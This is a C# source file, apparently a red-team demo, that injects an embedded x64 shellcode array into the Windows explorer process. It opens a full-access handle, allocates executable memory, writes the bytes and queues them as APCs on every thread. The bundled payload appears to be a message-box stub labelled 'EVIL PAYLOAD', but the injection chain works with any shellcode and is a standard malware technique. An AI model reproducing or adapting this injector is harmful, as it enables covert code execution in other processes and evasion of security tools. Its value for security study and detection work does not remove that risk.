﻿using System;
using System.Diagnostics;
using System.Linq;

namespace EarlyBirdAPCInjection
{
    class Program
    {
        public static byte[] shellcode = new byte[291] {
            0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
            0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
            0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,
            0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
            0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,
            0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
            0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,
            0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,
            0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,
            0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
            0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
            0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,
            0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,
            0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
            0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,0xc1,
            0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0xfe,0x00,0x00,0x00,0x3e,0x4c,0x8d,
            0x85,0x0b,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
            0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x45,0x56,0x49,
            0x4c,0x20,0x50,0x41,0x59,0x4c,0x4f,0x41,0x44,0x00,0x4d,0x65,0x73,0x73,0x61,
            0x67,0x65,0x42,0x6f,0x78,0x00 };

        static void Main(string[] args)
        {
            Console.WriteLine("Enumerating processes");
            Process[] procList = Process.GetProcesses();
            int pId = 0;
            IntPtr pHandle = IntPtr.Zero;

            foreach(Process p in procList)
            {
                if(p.ProcessName.Equals("explorer"))
                {
                    //pHandle = p.SafeHandle.DangerousGetHandle();
                    pId = p.Id;
                    Console.WriteLine("Process name: {0} ID: {1}", p.ProcessName, p.Id);
                    break;
                }
            }

            Console.ReadLine();
            Console.WriteLine("Obtaining handle");
            //pHandle = procList.Where(p => p.ProcessName.Equals("explorer")).First().SafeHandle.DangerousGetHandle();
            pHandle = imports.OpenProcess(structs.ProcessAccessFlags.All, false, pId);

            Console.ReadLine();
            Console.WriteLine("Allocating memory");
            IntPtr memoryAddr = imports.VirtualAllocEx(pHandle, IntPtr.Zero, (uint)(shellcode.Length), structs.AllocationType.Commit | structs.AllocationType.Reserve, structs.MemoryProtection.ExecuteReadWrite);

            Console.ReadLine();
            Console.WriteLine("Writing memory");
            IntPtr bytesWritten = IntPtr.Zero;
            imports.WriteProcessMemory(pHandle, memoryAddr, shellcode, shellcode.Length, out bytesWritten);

            Console.ReadLine();
            Console.WriteLine("Enumerating threads");
            ProcessThreadCollection pThreads = Process.GetProcessById(pId).Threads;

            foreach (ProcessThread thread in pThreads)
            {
                Console.WriteLine("Opening thread");
                IntPtr threadHandle = imports.OpenThread(structs.ThreadAccess.SET_CONTEXT, false, thread.Id);

                Console.WriteLine("Assigning shellcode addr to target thread APC queue");
                imports.QueueUserAPC(memoryAddr, threadHandle, IntPtr.Zero);
            }

            Console.WriteLine("Pausing execution");
            Console.ReadLine();
        }
    }
}